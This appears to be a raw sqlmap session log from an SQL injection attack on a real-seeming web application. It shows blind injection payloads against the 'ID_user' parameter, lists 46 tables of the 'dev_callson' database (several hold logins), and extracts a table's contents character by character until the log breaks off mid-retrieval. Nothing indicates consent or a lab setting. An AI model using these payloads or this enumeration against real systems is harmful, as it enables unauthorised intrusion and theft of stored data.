        ___
       __H__
 ___ ___[,]_____ ___ ___  {1.3.10.26#dev}
|_ -| . [,]     | .'| . |
|___|_  [.]_|_|_|__,|  _|
      |_|V...       |_|   http://sqlmap.org

[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program

[*] starting @ 22:37:24 /2019-11-04/

[?1049h[22;0;0t[1;24r(B[m[4l[?7h[24;1H[?1049l[23;0;0t[?1l>[22:37:24] [INFO] fetched random HTTP User-Agent header value 'Mozilla/5.0 (compatible; MSIE 7.0; Windows NT 5.0; Trident/4.0; FBSMTWB; .NET CLR 2.0.34861; .NET CLR 3.0.3746.3218; .NET CLR 3.5.33652; msn OptimizedIE8;ENUS)' from file '/root/sqlmap/data/txt/user-agents.txt'
[22:37:24] [INFO] resuming back-end DBMS 'mysql' 
[22:37:25] [INFO] testing connection to the target URL
[22:37:27] [INFO] heuristics detected web page charset 'UTF-8-SIG'
sqlmap resumed the following injection point(s) from stored session:
---
Parameter: ID_user (GET)
    Type: boolean-based blind
    Title: AND boolean-based blind - WHERE or HAVING clause
    Payload: ID_user=10 AND 8847=8847&href=http://www.symantec.com/page.jsp?id=seal-transition

    Type: time-based blind
    Title: MySQL >= 5.0.12 OR time-based blind (SLEEP)
    Payload: ID_user=10 OR SLEEP(5)&href=http://www.symantec.com/page.jsp?id=seal-transition
---
[22:37:27] [INFO] the back-end DBMS is MySQL
web server operating system: Windows 2008 R2 or 7
web application technology: ASP.NET, Microsoft IIS 7.5, PHP 5.2.13
back-end DBMS: MySQL >= 5.0.12
[22:37:28] [INFO] fetching tables for database: 'dev_callson'
[22:37:28] [INFO] fetching number of tables for database 'dev_callson'
[22:37:28] [INFO] resumed: 46
[22:37:28] [INFO] retrieving the length of query output
[22:37:28] [INFO] resumed: 12
[22:37:28] [INFO] resumed: accor_blocks
[22:37:28] [INFO] retrieving the length of query output
[22:37:28] [INFO] resumed: 20
[22:37:28] [INFO] resumed: accor_blocks_details
[22:37:28] [INFO] retrieving the length of query output
[22:37:28] [INFO] resumed: 20
[22:37:28] [INFO] resumed: accor_events_details
[22:37:28] [INFO] retrieving the length of query output
[22:37:28] [INFO] resumed: 16
[22:37:28] [INFO] resumed: accor_events_log
[22:37:28] [INFO] retrieving the length of query output
[22:37:28] [INFO] resumed: 17
[22:37:28] [INFO] resumed: accor_events_type
[22:37:28] [INFO] retrieving the length of query output
[22:37:28] [INFO] resumed: 21
[22:37:28] [INFO] resumed: accor_supported_sites
[22:37:28] [INFO] retrieving the length of query output
[22:37:28] [INFO] resumed: 11
[22:37:28] [INFO] resumed: accor_users
[22:37:28] [INFO] retrieving the length of query output
[22:37:28] [INFO] resumed: 8
[22:37:28] [INFO] resumed: accounts
[22:37:28] [INFO] retrieving the length of query output
[22:37:28] [INFO] resumed: 8
[22:37:28] [INFO] resumed: activite
[22:37:28] [INFO] retrieving the length of query output
[22:37:28] [INFO] resumed: 10
[22:37:28] [INFO] resumed: buzz_panel
[22:37:28] [INFO] retrieving the length of query output
[22:37:28] [INFO] resumed: 17
[22:37:28] [INFO] resumed: buzz_panel_global
[22:37:28] [INFO] retrieving the length of query output
[22:37:28] [INFO] resumed: 15
[22:37:28] [INFO] resumed: callson_callbus
[22:37:28] [INFO] retrieving the length of query output
[22:37:28] [INFO] resumed: 13
[22:37:28] [INFO] resumed: callson_devis
[22:37:28] [INFO] retrieving the length of query output
[22:37:28] [INFO] resumed: 9
[22:37:28] [INFO] resumed: effectifs
[22:37:28] [INFO] retrieving the length of query output
[22:37:28] [INFO] resumed: 12
[22:37:28] [INFO] resumed: etude_ancols
[22:37:28] [INFO] retrieving the length of query output
[22:37:28] [INFO] resumed: 10
[22:37:28] [INFO] resumed: evaluation
[22:37:28] [INFO] retrieving the length of query output
[22:37:28] [INFO] resumed: 12
[22:37:28] [INFO] resumed: everyopinion
[22:37:28] [INFO] retrieving the length of query output
[22:37:28] [INFO] resumed: 19
[22:37:28] [INFO] resumed: everyopinion_global
[22:37:28] [INFO] retrieving the length of query output
[22:37:28] [INFO] resumed: 22
[22:37:28] [INFO] resumed: everyopinion_global_v1
[22:37:28] [INFO] retrieving the length of query output
[22:37:28] [INFO] resumed: 15
[22:37:28] [INFO] resumed: everyopinion_v1
[22:37:28] [INFO] retrieving the length of query output
[22:37:28] [INFO] resumed: 9
[22:37:28] [INFO] resumed: fonctions
[22:37:28] [INFO] retrieving the length of query output
[22:37:28] [INFO] resumed: 8
[22:37:28] [INFO] resumed: immochan
[22:37:28] [INFO] retrieving the length of query output
[22:37:28] [INFO] resumed: 15
[22:37:28] [INFO] resumed: immochan_global
[22:37:28] [INFO] retrieving the length of query output
[22:37:28] [INFO] resumed: 7
[22:37:28] [INFO] resumed: inscrit
[22:37:28] [INFO] retrieving the length of query output
[22:37:28] [INFO] resumed: 17
[22:37:28] [INFO] resumed: leboncoin_monitor
[22:37:28] [INFO] retrieving the length of query output
[22:37:28] [INFO] resumed: 3
[22:37:28] [INFO] resumed: log
[22:37:28] [INFO] retrieving the length of query output
[22:37:28] [INFO] resumed: 5
[22:37:28] [INFO] resumed: login
[22:37:28] [INFO] retrieving the length of query output
[22:37:28] [INFO] resumed: 7
[22:37:28] [INFO] resumed: magasin
[22:37:28] [INFO] retrieving the length of query output
[22:37:28] [INFO] resumed: 15
[22:37:28] [INFO] resumed: market_research
[22:37:28] [INFO] retrieving the length of query output
[22:37:28] [INFO] resumed: 8
[22:37:28] [INFO] resumed: matieres
[22:37:28] [INFO] retrieving the length of query output
[22:37:28] [INFO] resumed: 13
[22:37:28] [INFO] resumed: orange_logins
[22:37:28] [INFO] retrieving the length of query output
[22:37:28] [INFO] resumed: 11
[22:37:28] [INFO] resumed: orange_logs
[22:37:28] [INFO] retrieving the length of query output
[22:37:28] [INFO] resumed: 14
[22:37:28] [INFO] resumed: orange_monitor
[22:37:28] [INFO] retrieving the length of query output
[22:37:28] [INFO] resumed: 15
[22:37:28] [INFO] resumed: orange_parcours
[22:37:28] [INFO] retrieving the length of query output
[22:37:28] [INFO] resumed: 8
[22:37:28] [INFO] resumed: ouvrages
[22:37:28] [INFO] retrieving the length of query output
[22:37:28] [INFO] resumed: 11
[22:37:28] [INFO] resumed: participant
[22:37:28] [INFO] retrieving the length of query output
[22:37:28] [INFO] resumed: 7
[22:37:28] [INFO] resumed: pws_sms
[22:37:28] [INFO] retrieving the length of query output
[22:37:28] [INFO] resumed: 6
[22:37:28] [INFO] resumed: region
[22:37:28] [INFO] retrieving the length of query output
[22:37:28] [INFO] resumed: 10
[22:37:28] [INFO] resumed: repondants
[22:37:28] [INFO] retrieving the length of query output
[22:37:28] [INFO] resumed: 14
[22:37:28] [INFO] resumed: repondants_old
[22:37:28] [INFO] retrieving the length of query output
[22:37:28] [INFO] resumed: 16
[22:37:28] [INFO] resumed: selectedmatieres
[22:37:28] [INFO] retrieving the length of query output
[22:37:28] [INFO] resumed: 9
[22:37:28] [INFO] resumed: useragent
[22:37:28] [INFO] retrieving the length of query output
[22:37:28] [INFO] resumed: 11
[22:37:28] [INFO] resumed: wati_events
[22:37:28] [INFO] retrieving the length of query output
[22:37:28] [INFO] resumed: 11
[22:37:28] [INFO] resumed: wati_logins
[22:37:28] [INFO] retrieving the length of query output
[22:37:28] [INFO] resumed: 9
[22:37:28] [INFO] resumed: wati_logs
[22:37:28] [INFO] retrieving the length of query output
[22:37:28] [INFO] resumed: 12
[22:37:28] [INFO] resumed: wati_monitor
[22:37:28] [INFO] fetching columns for table 'matieres' in database 'dev_callson'
[22:37:28] [INFO] resumed: 3
[22:37:28] [INFO] retrieving the length of query output
[22:37:28] [INFO] resumed: 9
[22:37:28] [INFO] resumed: idmatiere
[22:37:28] [INFO] retrieving the length of query output
[22:37:28] [INFO] resumed: 7
[22:37:28] [INFO] resumed: matiere
[22:37:28] [INFO] retrieving the length of query output
[22:37:28] [INFO] resumed: 6
[22:37:28] [INFO] resumed: niveau
[22:37:28] [INFO] fetching entries for table 'matieres' in database 'dev_callson'
[22:37:28] [INFO] fetching number of entries for table 'matieres' in database 'dev_callson'
[22:37:28] [INFO] retrieved: 
[22:37:28] [WARNING] reflective value(s) found and filtering out
13
[22:37:48] [INFO] retrieving the length of query output
[22:37:48] [INFO] retrieved: 1
[22:37:52] [INFO] retrieved: 5
[22:38:01] [INFO] retrieving the length of query output
[22:38:01] [INFO] retrieved: 22
[22:38:13] [INFO] retrieved: ______________________[22:38:13] [INFO] retrieved: [22:38:30] [INFO] retrieved: ___e__________________ 1/22 (4%)[22:38:31] [INFO] retrieved: __ie__________________ 2/22 (9%)[22:38:33] [INFO] retrieved: S_ie__________________ 3/22 (13%)[22:38:34] [INFO] retrieved: Scie__________________ 4/22 (18%)[22:38:42] [INFO] retrieved: Scie_c________________ 5/22 (22%)[22:38:44] [INFO] retrieved: Scie_ce_______________ 6/22 (27%)[22:38:44] [INFO] retrieved: Science_______________ 7/22 (31%)[22:38:52] [INFO] retrieved: Sciences______________ 8/22 (36%)